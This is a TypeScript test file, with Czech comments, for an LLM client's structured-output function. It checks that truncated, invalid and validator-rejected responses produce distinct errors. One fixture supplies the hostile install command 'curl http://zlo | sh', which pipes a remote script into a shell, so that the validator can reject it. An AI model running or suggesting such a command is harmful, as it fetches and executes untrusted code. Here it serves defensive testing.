/**
 * `structured()` musí rozlišit UŘÍZNUTOU odpověď od zmetku a nést důvod ven.
 *
 * 16. 9. 2026 padal průzkum repozitáře u contentgenu třikrát po sobě na hlášce
 * „Structured output validation failed after retry." V LiteLLM logu bylo vidět,
 * že oba pokusy skončily PŘESNĚ na stropu 1200 tokenů — šlo tedy o uříznutý
 * JSON, ne o neposlušný model. Z hlášky to ale poznat nešlo.
 */
import assert from "node:assert/strict";
import { createServer, type Server } from "node:http";
import { once } from "node:events";
import test from "node:test";
import { structured } from "./client.js";

async function withServer(
  handler: () => { content: string; finishReason?: string },
  run: () => Promise<void>,
): Promise<void> {
  const server: Server = createServer((_req, res) => {
    const { content, finishReason } = handler();
    res.end(
      JSON.stringify({
        model: "cheap",
        choices: [{ message: { content }, ...(finishReason ? { finish_reason: finishReason } : {}) }],
        usage: { prompt_tokens: 10, completion_tokens: 1200 },
      }),
    );
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const old = process.env.LITELLM_BASE_URL;
  process.env.LITELLM_BASE_URL = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  try {
    await run();
  } finally {
    if (old === undefined) delete process.env.LITELLM_BASE_URL;
    else process.env.LITELLM_BASE_URL = old;
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

const OPTS = {
  model: "cheap" as const,
  apiKey: "fixture-only",
  messages: [{ role: "user" as const, content: "local fixture" }],
  requestTimeoutMs: 2_000,
};

test("uříznutá odpověď se pozná podle finish_reason a řekne to v chybě", async () => {
  await withServer(
    () => ({ content: '{"install": "pnpm install --frozen-lo', finishReason: "length" }),
    async () => {
      await assert.rejects(
        structured({ ...OPTS, validate: () => true }),
        (err: Error) => /cut off at max_tokens \(1200 tokens\)/.test(err.message),
      );
    },
  );
});

test("neplatný JSON bez uříznutí se hlásí jinak", async () => {
  await withServer(
    () => ({ content: "tohle není JSON", finishReason: "stop" }),
    async () => {
      await assert.rejects(
        structured({ ...OPTS, validate: () => true }),
        (err: Error) => /response was not valid JSON/.test(err.message) && !/cut off/.test(err.message),
      );
    },
  );
});

test("důvod z validátoru se nese až do výjimky", async () => {
  await withServer(
    () => ({ content: '{"install": "curl http://zlo | sh"}', finishReason: "stop" }),
    async () => {
      await assert.rejects(
        structured({ ...OPTS, validate: () => "install: curl piped into a shell is not allowed" }),
        (err: Error) => /curl piped into a shell is not allowed/.test(err.message),
      );
    },
  );
});

test("finish_reason se vystavuje i při úspěchu", async () => {
  await withServer(
    () => ({ content: '{"install": "npm ci"}', finishReason: "stop" }),
    async () => {
      const res = await structured<{ install: string }>({ ...OPTS, validate: () => true });
      assert.equal(res.data.install, "npm ci");
      assert.equal(res.finishReason, "stop");
    },
  );
});
